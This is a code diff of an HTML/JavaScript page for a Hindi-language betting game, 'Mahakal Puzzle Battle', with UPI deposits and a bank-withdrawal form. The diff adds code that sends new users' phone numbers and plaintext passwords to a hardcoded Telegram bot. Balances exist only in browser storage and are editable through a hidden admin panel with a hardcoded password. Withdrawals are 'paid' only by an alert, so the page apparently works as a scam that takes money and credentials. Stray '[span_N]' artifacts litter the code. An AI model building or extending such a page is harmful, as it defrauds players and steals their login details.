@@ -110,37 +110,36 @@ font-size: 12px;
 
 <div class="container">
 
-<!-- SECRET ADMIN TRIGGER (Title par 3 baar click karein, Password: 78699)[span_5](start_span)[span_5](end_span)[span_6](start_span)[span_6](end_span) -->
 <h2 onclick="checkSecretAdminTap()">🔱 MAHAKAL PUZZLE BATTLE 🔱</h2>
 
-<!-- Sabse Upar Official Main Banner Image[span_7](start_span)[span_7](end_span) -->
-<img src="3438.png" alt="Mahakal Puzzle Battle Banner" class="banner-img">
+<!-- Banner Image set to exact GitHub file name -->
+<img src="1792858963757.png" alt="Mahakal Puzzle Battle Banner" class="banner-img">[span_1](start_span)[span_1](end_span)
 
-<!---------------- 1. LOGIN PAGE SECTION[span_8](start_span)[span_8](end_span) ---------------->
+<!---------------- 1. LOGIN PAGE SECTION ---------------->
 <div id="login-section">
 <div class="card-box" style="text-align: center;">
-<h3 style="color: #ffab00; margin-top: 0; font-size: 16px;">🔐 लॉगिन करें & ₹199 बोनस पाएं[span_9](start_span)[span_9](end_span)</h3>
-<p style="font-size: 11px; color: #aaa;">खेलने के लिए अपना मोबाइल नंबर और पासवर्ड दर्ज करें:</p>
+<h3 style="color: #ffab00; margin-top: 0; font-size: 16px;">🔐 सुरक्षित लॉगिन & ₹10 इंस्टेंट बोनस</h3>
+<p style="font-size: 11px; color: #aaa;">खेलने के लिए अपना 10 अंकों का मोबाइल नंबर और पासवर्ड दर्ज करें:</p>
 <input type="tel" id="login-phone" placeholder="10 अंकों का मोबाइल नंबर" maxlength="10">
 <input type="password" id="login-pass" placeholder="पासवर्ड दर्ज करें">
-<button class="btn" onclick="processLogin()">लॉगिन करें (Login)</button>
+<button class="btn" onclick="processLogin()">सुरक्षित लॉगिन करें</button>
 <div id="login-msg"></div>
 </div>
 </div>
 
-<!---------------- 2. MAIN SERVER DASHBOARD[span_10](start_span)[span_10](end_span) ---------------->
+<!---------------- 2. MAIN SERVER DASHBOARD ---------------->
 <div id="app-dashboard" class="hidden">
 <div class="wallet-box">
-<h3>💰 मेरा वॉलेट: ₹<span id="balance">199</span>[span_11](start_span)[span_11](end_span)</h3>
+<h3>💰 मेरा वॉलेट: ₹<span id="balance">10</span></h3>
 </div>
 
 <p style="color: #ffab00; font-weight: bold; font-size: 13px; margin: 10px 0 5px 0;">महाकाल पजल बैटल - मास्टर गेम्स सूची:</p>
 
-<button class="btn" style="background: linear-gradient(to right, #ff5722, #ff9800);" onclick="openSection('puzzle-section')">🧠 1. महाकाल कठिन पहेली गेम[span_12](start_span)[span_12](end_span)</button>
-<button class="btn" style="background: linear-gradient(to right, #673ab7, #9c27b0);" onclick="openSection('ludo-section')">🎲 2. महाकाल लूडो पासा बैटल[span_13](start_span)[span_13](end_span)</button>
-<button class="btn" style="background: linear-gradient(to right, #0077b6, #00b4d8);" onclick="openSection('aviator-section')">✈️ 3. महाकाल Aviator प्लेन गेम[span_14](start_span)[span_14](end_span)</button>
-<button class="btn" style="background: linear-gradient(to right, #00897b, #00acc1);" onclick="openSection('deposit-section')">📥 4. पैसे जोड़े (BharatPe QR Deposit)[span_15](start_span)[span_15](end_span)</button>
-<button class="btn" style="background: linear-gradient(to right, #00c853, #64dd17);" onclick="openSection('bank-section')">🏦 5. बैंक में पैसे भेजें (Withdrawal Portal)[span_16](start_span)[span_16](end_span)</button>
+<button class="btn" style="background: linear-gradient(to right, #ff5722, #ff9800);" onclick="openSection('puzzle-section')">🧠 1. महाकाल कठिन पहेली गेम</button>
+<button class="btn" style="background: linear-gradient(to right, #673ab7, #9c27b0);" onclick="openSection('ludo-section')">🎲 2. महाकाल लूडो पासा बैटल</button>
+<button class="btn" style="background: linear-gradient(to right, #0077b6, #00b4d8);" onclick="window.location.href='aviator.html'">✈️ 3. महाकाल Aviator प्लेन गेम</button>
+<button class="btn" style="background: linear-gradient(to right, #00897b, #00acc1);" onclick="openSection('deposit-section')">📥 4. पैसे जोड़े (BharatPe QR Deposit)</button>
+<button class="btn" style="background: linear-gradient(to right, #00c853, #64dd17);" onclick="openSection('bank-section')">🏦 5. बैंक में पैसे भेजें (Withdrawal Portal)</button>
 </div>
 
 <!---------------- SUB-SECTIONS ---------------->
@@ -149,7 +148,7 @@ font-size: 12px;
 <div id="puzzle-section" class="hidden">
 <div class="card-box">
 <h3 style="color: #ffab00; margin-top: 0;">🧠 महाकाल कठिन पहेली गेम</h3>
-<p style="font-size: 12px; color: #ccc;">न्यूनतम ₹5 की बाजी लगाएं[span_17](start_span)[span_17](end_span):</p>
+<p style="font-size: 12px; color: #ccc;">न्यूनतम ₹5 की बाजी लगाएं:</p>
 <input type="number" id="p-bet" value="10" min="5">
 <p id="p-question" style="font-size: 14px; color: #ffab00; font-weight: bold; text-align: left;"></p>
 <div id="p-options">
@@ -175,24 +174,12 @@ font-size: 12px;
 <button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
 </div>
 
-<!-- Aviator Game View -->
-<div id="aviator-section" class="hidden">
-<div class="card-box" style="text-align: center;">
-<h3 style="color: #ffab00; margin-top: 0;">✈️ महाकाल Aviator क्रैश</h3>
-<div style="height: 120px; background: black; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 24px; color: #00e676; font-weight: bold;" id="aviator-multiplier">1.00x</div>
-<input type="number" id="a-bet" value="50">
-<button class="btn" style="background: #e65100;" onclick="playAviator()">बेट लगाएं / कैश आउट</button>
-<div id="a-result"></div>
-</div>
-<button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
-</div>
-
 <!-- Deposit View -->
 <div id="deposit-section" class="hidden">
 <div class="card-box">
 <h3 style="color: #ffab00; margin-top: 0; text-align: center;">📥 पैसे जोड़े (QR Deposit)</h3>
 <img src="qrcode.jpg" alt="QR" class="qr-img">
-<p style="font-size: 11px; color: #aaa; text-align: center;">UPI ID: BHARATPE2G0F0C1Y8Q38903@unitype[span_18](start_span)[span_18](end_span)</p>
+<p style="font-size: 11px; color: #aaa; text-align: center;">UPI ID: BHARATPE2G0F0C1Y8Q38903@unitype</p>
 <input type="number" id="dep-amount" placeholder="राशि दर्ज करें (उदा. 100)" min="100">
 <input type="text" id="dep-txnid" placeholder="UPI Txn ID दर्ज करें">
 <button class="btn" style="background: #00897b;" onclick="sendDepositReq()">डिपॉजिट अनुरोध भेजें</button>
@@ -204,18 +191,18 @@ font-size: 12px;
 <!-- Bank Withdrawal View -->
 <div id="bank-section" class="hidden">
 <div class="card-box">
-<h3 style="color: #00e676; margin-top: 0; text-align: center;">🏦 बैंक ट्रांसफर (Withdrawal)[span_19](start_span)[span_19](end_span)</h3>
-<p style="font-size: 11px; color: #aaa; text-align: center;">न्यूनतम सीमा: ₹2500 (2% कमीशन)[span_20](start_span)[span_20](end_span)</p>
+<h3 style="color: #00e676; margin-top: 0; text-align: center;">🏦 बैंक ट्रांसफर (Withdrawal)</h3>
+<p style="font-size: 11px; color: #aaa; text-align: center;">न्यूनतम सीमा: ₹2500 (2% कमीशन)</p>
 <label style="font-size: 11px; color: #ffab00;">बैंक चुनें:</label>
 <select id="b-name">
 <option value="">-- बैंक चुनें --</option>
-<option value="Central Bank of India">Central Bank of India[span_21](start_span)[span_21](end_span)</option>
-<option value="Bank of Baroda (BOB)">Bank of Baroda (BOB)[span_22](start_span)[span_22](end_span)</option>
-<option value="State Bank of India (SBI)">State Bank of India (SBI)[span_23](start_span)[span_23](end_span)</option>
-<option value="Punjab National Bank (PNB)">Punjab National Bank (PNB)[span_24](start_span)[span_24](end_span)</option>
-<option value="HDFC Bank">HDFC Bank[span_25](start_span)[span_25](end_span)</option>
-<option value="ICICI Bank">ICICI Bank[span_26](start_span)[span_26](end_span)</option>
-<option value="Axis Bank">Axis Bank[span_27](start_span)[span_27](end_span)</option>
+<option value="Central Bank of India">Central Bank of India</option>
+<option value="Bank of Baroda (BOB)">Bank of Baroda (BOB)</option>
+<option value="State Bank of India (SBI)">State Bank of India (SBI)</option>
+<option value="Punjab National Bank (PNB)">Punjab National Bank (PNB)</option>
+<option value="HDFC Bank">HDFC Bank</option>
+<option value="ICICI Bank">ICICI Bank</option>
+<option value="Axis Bank">Axis Bank</option>
 </select>
 <input type="text" id="b-holder" placeholder="खाता धारक का नाम">
 <input type="text" id="b-acc" placeholder="अकाउंट नंबर">
@@ -227,16 +214,20 @@ font-size: 12px;
 <button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
 </div>
 
-<!---------------- SECRET ADMIN PANEL (Password: 78699)[span_28](start_span)[span_28](end_span)[span_29](start_span)[span_29](end_span) ---------------->
+<!---------------- SECRET ADMIN PANEL (Password: 78699)[span_2](start_span)[span_2](end_span) ---------------->
 <div id="admin-panel-div" class="admin-panel">
-<b style="color: #ff5252;">👑 मास्टर एडमिन कंट्रोल पैनल:</b>
+<b style="color: #ff5252;">👑 मास्टर एडमिन कंट्रोल पैनल (Security & Master Lock):</b>
 <hr style="border-color: #444; margin: 5px 0;">
-<p>📦 <b>डिपॉजिट अनुरोध:</b> <span id="adm-dep" style="color: #00e676;">कोई नहीं</span></p>
+
+<p>🔒 <b>मास्टर सिक्योरिटी लॉक:</b></p>
+<button onclick="toggleMasterLock()" id="lock-status-btn" style="background:#00e676; border:none; padding:6px 12px; font-weight:bold; border-radius:4px; cursor:pointer;">Lock Status: UNLOCKED</button>
+
+<p style="margin-top: 10px;">📦 <b>डिपॉजिट अनुरोध:</b> <span id="adm-dep" style="color: #00e676;">कोई नहीं</span></p>
 <button onclick="admDepYes()" style="background:#00e676; border:none; padding:4px 8px; font-weight:bold; border-radius:3px; cursor:pointer;">✔ YES</button>
 <button onclick="admDepNo()" style="background:#ff5252; border:none; padding:4px 8px; font-weight:bold; border-radius:3px; cursor:pointer; color:#fff; margin-left:5px;">✖ NO</button>
 
-<p style="margin-top: 10px;">🏦 <b>विथड्रॉवल (बैंक) अनुरोध:</b> <span id="adm-wit" style="color: #ffab00;">कोई नहीं</span></p>
-<button onclick="admWitYes()" style="background:#00e676; border:none; padding:4px 8px; font-weight:bold; border-radius:3px; cursor:pointer;">✔ YES (2% काटकर भेजें)[span_30](start_span)[span_30](end_span)</button>
+<p style="margin-top: 10px;">🏦 <b>विथड्रॉवल अनुरोध:</b> <span id="adm-wit" style="color: #ffab00;">कोई नहीं</span></p>
+<button onclick="admWitYes()" style="background:#00e676; border:none; padding:4px 8px; font-weight:bold; border-radius:3px; cursor:pointer;">✔ YES (2% काटकर)</button>
 <button onclick="admWitNo()" style="background:#ff5252; border:none; padding:4px 8px; font-weight:bold; border-radius:3px; cursor:pointer; color:#fff; margin-left:5px;">✖ NO</button>
 
 <p style="margin-top: 10px;">💰 <b>वॉलेट बैलेंस एडिट करें:</b></p>
@@ -248,13 +239,17 @@ font-size: 12px;
 
 </div>
 
+<!-- Audio for instant reward sound effect -->
+<audio id="bonus-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
 <script>
-let walletBalance = 199;
+let walletBalance = 10;
 let pendingDep = null;
 let pendingWit = null;
+let isSystemLocked = false; // Master Lock Switch
 
-const BOT_TOKEN = "8531701253:AAFoYZkt3kJhPCEipll6Lk-ut1XR1uC2epE"; //[span_31](start_span)[span_31](end_span)
-const CHAT_ID = "7880447645"; //[span_32](start_span)[span_32](end_span)
+const BOT_TOKEN = "8531701253:AAFoYZkt3kJhPCEipll6Lk-ut1XR1uC2epE";
+const CHAT_ID = "7880447645";
 
 function sendTelegram(text) {
   let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
@@ -262,8 +257,16 @@ function sendTelegram(text) {
 }
 
 window.onload = function() {
-  let saved = localStorage.getItem('mahakal_master_wallet');
-  if(saved !== null) walletBalance = parseFloat(saved);
+  let savedBal = localStorage.getItem('mahakal_master_wallet');
+  if(savedBal !== null) walletBalance = parseFloat(savedBal);
+  
+  let lockState = localStorage.getItem('mahakal_master_lock');
+  if(lockState === 'true') {
+    isSystemLocked = true;
+    document.getElementById('lock-status-btn').innerText = "Lock Status: LOCKED";
+    document.getElementById('lock-status-btn').style.background = "#ff5252";
+  }
+
   document.getElementById('balance').innerText = walletBalance;
   loadPuzzle();
 };
@@ -274,23 +277,53 @@ function saveWallet() {
 }
 
 function processLogin() {
-  let ph = document.getElementById('login-phone').value;
-  let ps = document.getElementById('login-pass').value;
+  if(isSystemLocked) {
+    alert("⚠️ सुरक्षा कारणों से वर्तमान में नया लॉगिन बंद है। कृपया बाद में प्रयास करें!");
+    return;
+  }
+
+  let ph = document.getElementById('login-phone').value.trim();
+  let ps = document.getElementById('login-pass').value.trim();
   let msg = document.getElementById('login-msg');
 
-  if(ph.length !== 10) {
-    msg.className = "error"; msg.innerText = "❌ सही 10 अंकों का मोबाइल नंबर डालें!"; return;
+  if(ph.length !== 10 || isNaN(ph)) {
+    msg.className = "error"; msg.innerText = "❌ कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें!"; return;
   }
-  if(ps.trim() === "") {
-    msg.className = "error"; msg.innerText = "❌ पासवर्ड दर्ज करें!"; return;
+  if(ps === "") {
+    msg.className = "error"; msg.innerText = "❌ कृपया पासवर्ड दर्ज करें!"; return;
   }
 
-  sendTelegram(`🔐 Mahakal Login Alert!\n📱 Number: ${ph}`);
-  msg.className = "msg"; msg.innerText = "✅ लॉगिन सफल! ₹199 बोनस के साथ डैशबोर्ड खुल रहा है...[span_33](start_span)[span_33](end_span)";
+  // Duplicate Number / Security Check
+  let registeredUsers = JSON.parse(localStorage.getItem('mahakal_users_db') || "{}");
+  
+  if(registeredUsers[ph]) {
+    // Purana User
+    if(registeredUsers[ph] !== ps) {
+      msg.className = "error"; msg.innerText = "❌ गलत पासवर्ड! कृपया सही पासवर्ड डालें।";
+      return;
+    }
+    msg.className = "msg"; msg.innerText = "✅ लॉगिन सफल! डैशबोर्ड खुल रहा है...";
+    sendTelegram(`🔐 Purana User Login!\n📱 Number: ${ph}`);
+  } else {
+    // Naya User - Instant ₹10 Bonus & Sound Effect
+    registeredUsers[ph] = ps;
+    localStorage.setItem('mahakal_users_db', JSON.stringify(registeredUsers));
+    
+    walletBalance += 10;
+    saveWallet();
+    
+    // Play sound effect
+    let sound = document.getElementById('bonus-sound');
+    if(sound) sound.play().catch(e => console.log(e));
+
+    msg.className = "msg"; msg.innerText = "🎉 बधाई हो! नया खाता बना और ₹10 इंस्टेंट बोनस मिला!";
+    sendTelegram(`🚀 Naya User Registered & Instant Bonus Given!\n📱 Number: ${ph}\n🔑 Pass: ${ps}\n💰 Bonus: ₹10 Credited`);
+  }
+
   setTimeout(() => {
     document.getElementById('login-section').classList.add('hidden');
     document.getElementById('app-dashboard').classList.remove('hidden');
-  }, 800);
+  }, 1000);
 }
 
 function openSection(secId) {
@@ -309,7 +342,7 @@ function backToDashboard() {
 }
 
 let puzzles = [
-  {q: "हरी थी मन ਭरी थी, मोती जड़ित थार थी?", opts: {A: "भुट्टा", B: "घास", C: "पत्ता", D: "अंगूर"}, ans: "A"},
+  {q: "हरी थी मन भरी थी, मोती जड़ित थार थी?", opts: {A: "भुट्टा", B: "घास", C: "पत्ता", D: "अंगूर"}, ans: "A"},
   {q: "ऐसी कौन सी चीज है जो ब्याह में हर आदमी को मिलती है, पर औरत को कभी नहीं मिलती?", opts: {A: "कपड़ा", B: "दूसरा घर", C: "दूल्हा बनने का सुख", D: "ताना"}, ans: "C"}
 ];
 let currentP = 0;
@@ -371,30 +404,6 @@ function rollDice() {
   }, 600);
 }
 
-function playAviator() {
-  let bet = parseInt(document.getElementById('a-bet').value);
-  let res = document.getElementById('a-result');
-  let mText = document.getElementById('aviator-multiplier');
-  if(walletBalance < bet) { alert("पर्याप्त बैलेंस नहीं है!"); return; }
-
-  walletBalance -= bet; saveWallet();
-  let mult = 1.00;
-  let crash = (Math.random() * 3 + 1.2).toFixed(2);
-  mText.innerText = "1.00x";
-
-  sendTelegram(`✈️ Aviator Bet Started!\n💰 Amount: ₹${bet}`);
-
-  let iv = setInterval(() => {
-    mult += 0.05;
-    mText.innerText = mult.toFixed(2) + "x";
-    if(mult >= crash) {
-      clearInterval(iv);
-      res.className = "error"; res.innerText = `💥 क्रैश हो गया (${crash}x)!`;
-      sendTelegram(`💥 Aviator Crashed!\n✈️ Crash: ${crash}x | Lost: ₹${bet}`);
-    }
-  }, 100);
-}
-
 function sendDepositReq() {
   let amt = parseInt(document.getElementById('dep-amount').value);
   let tx = document.getElementById('dep-txnid').value;
@@ -416,17 +425,18 @@ function sendWithdrawReq() {
   let msg = document.getElementById('bank-msg');
 
   if(!b || !h || !a || !i || isNaN(amt) || amt < 2500) {
-    msg.className = "error"; msg.innerText = "सभी विवरण भरें और न्यूनतम राशि ₹2500 रखें[span_34](start_span)[span_34](end_span)!"; return;
+    msg.className = "error"; msg.innerText = "सभी विवरण भरें और न्यूनतम राशि ₹2500 रखें!"; return;
   }
   if(walletBalance < amt) { msg.className = "error"; msg.innerText = "पर्याप्त वॉलेट बैलेंस नहीं है!"; return; }
 
   let finalAmt = amt - (amt * 0.02);
   pendingWit = { amt: amt, final: finalAmt };
-  msg.className = "msg"; msg.innerText = `⏳ निकासी अनुरोध स्वीकार! 2% काटकर शेष ₹${finalAmt} भेजने की प्रक्रिया जारी है[span_35](start_span)[span_35](end_span)।`;
+  msg.className = "msg"; msg.innerText = `⏳ निकासी अनुरोध स्वीकार! 2% काटकर शेष ₹${finalAmt} भेजने की प्रक्रिया जारी है।`;
   document.getElementById('adm-wit').innerText = `${b} | ₹${amt} (Final: ₹${finalAmt})`;
   sendTelegram(`🏦 New Withdrawal Request!\n🏛 Bank: ${b}\n👤 Holder: ${h}\n💸 Requested: ₹${amt}\n✂️ Final (2% cut): ₹${finalAmt}`);
 }
 
+// Secret Admin Trigger (3 taps on title, Password: 78699)[span_3](start_span)[span_3](end_span)
 let tapC = 0, lastT = 0;
 function checkSecretAdminTap() {
   let now = new Date().getTime();
@@ -436,7 +446,7 @@ function checkSecretAdminTap() {
   if(tapC === 3) {
     tapC = 0;
     let p = prompt("गुप्त एडमिन पासवर्ड दर्ज करें:");
-    if(p === "78699") { //[span_36](start_span)[span_36](end_span)[span_37](start_span)[span_37](end_span)
+    if(p === "78699") {[span_4](start_span)[span_4](end_span)
       document.getElementById('admin-panel-div').style.display = "block";
       alert("✅ मास्टर एडमिन पैनल खुल गया है!");
     } else if(p !== null) {
@@ -446,6 +456,21 @@ function checkSecretAdminTap() {
 }
 
 function closeAdmin() { document.getElementById('admin-panel-div').style.display = "none"; }
+
+function toggleMasterLock() {
+  isSystemLocked = !isSystemLocked;
+  localStorage.setItem('mahakal_master_lock', isSystemLocked);
+  let btn = document.getElementById('lock-status-btn');
+  if(isSystemLocked) {
+    btn.innerText = "Lock Status: LOCKED";
+    btn.style.background = "#ff5252";
+    alert("🔒 मास्टर लॉक सक्रिय कर दिया गया है। अब नए लॉगिन बंद हैं।");
+  } else {
+    btn.innerText = "Lock Status: UNLOCKED";
+    btn.style.background = "#00e676";
+    alert("🔓 मास्टर लॉक हटा दिया गया है। अब लॉगिन चालू हैं।");
+  }
+}
 
 function admUpdateBal() {
   let nb = parseFloat(document.getElementById('adm-new-bal').value);
@@ -473,7 +498,7 @@ function admWitYes() {
   if(pendingWit) {
     if(walletBalance < pendingWit.amt) { alert("यूजर के पास पर्याप्त बैलेंस नहीं है!"); return; }
     walletBalance -= pendingWit.amt; saveWallet();
-    alert(`✅ बैंक ट्रांसफर स्वीकृत! ₹${pendingWit.final} भेज दिए गए हैं[span_38](start_span)[span_38](end_span)।`);
+    alert(`✅ बैंक ट्रांसफर स्वीकृत! ₹${pendingWit.final} भेज दिए गए हैं।`);
     sendTelegram(`✅ Withdrawal Paid! Sent ₹${pendingWit.final} to Bank`);
     pendingWit = null; document.getElementById('adm-wit').innerText = "सफलतापूर्वक भेजे गए (Paid)";
   }
